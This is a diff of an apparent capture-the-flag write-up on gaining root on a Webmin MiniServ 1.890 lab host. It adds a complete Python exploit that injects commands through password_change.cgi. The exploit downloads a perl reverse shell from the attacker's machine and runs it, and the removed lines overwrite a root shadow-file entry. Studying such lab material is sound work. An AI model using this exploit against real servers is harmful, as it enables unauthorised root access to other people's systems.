@@ -8,11 +8,33 @@
 I went to https://source.thm:10000 and found there:<br>
 ![webmin](./imgs/webmin.png)
 
-I looked for `MiniServ 1.890 exploit` in google and found a python script, which turned out to work.
+I looked for `MiniServ 1.890 exploit` in google and found a python script, which turned out to work.<br>
 
+Then I changed the script a little bit in order that I understand it and have more control over it.<br>
+Also, I found a good perl `reverse-shell`, set up an nc listener on port 2222 and ran my new script.
+```
+import os
 
-changeme:$6$xyz$9vc9yeDgngEirzYEeLZqCay8YLhc7JHmd1t2UYrjdm7dD0M6raCXz.xtEXBL4.aaRf26S/aKagS36D1iH7E79.
-root:$6$xyz$9vc9yeDgngEirzYEeLZqCay8YLhc7JHmd1t2UYrjdm7dD0M6raCXz.xtEXBL4.aaRf26S/aKagS36D1iH7E79.:18295:0:99999:7:::
+target = "source.thm"
+port = "10000"
+url = "https://"+target+":"+port+"/password_change.cgi"
 
-sed -i '1s/.*/root:$6$xyz$9vc9yeDgngEirzYEeLZqCay8YLhc7JHmd1t2UYrjdm7dD0M6raCXz.xtEXBL4.aaRf26S/aKagS36D1iH7E79.:18295:0:99999:7:::/' try.txt
-awk 'NR==1 {$0="root:$6$xyz$9vc9yeDgngEirzYEeLZqCay8YLhc7JHmd1t2UYrjdm7dD0M6raCXz.xtEXBL4.aaRf26S/aKagS36D1iH7E79.:18295:0:99999:7:::"} 1' try.txt > tmpfile && mv tmpfile try.txt
+rhost = "10.2.116.12"
+rport = 2222
+
+command1 = "curl -o perl_shell.pl http://10.2.116.12:8000/perl_shell.pl"
+command2 = "perl perl_shell.pl"
+
+header = f'Referer: https://{target}:{port}/session_login.cgi'
+
+payload = f'user=gotroot&pam=&expired=2|echo "";{command1}'
+os.system(f"curl -k {url} -d '{payload}' -H '{header}'")
+
+payload = f'user=gotroot&pam=&expired=2|echo "";{command2}'
+os.system(f"curl -k {url} -d '{payload}' -H '{header}'")
+```
+Then
+```
+python3 my_exp.py
+```
+And the nc listener will get you a root reverse-shell.
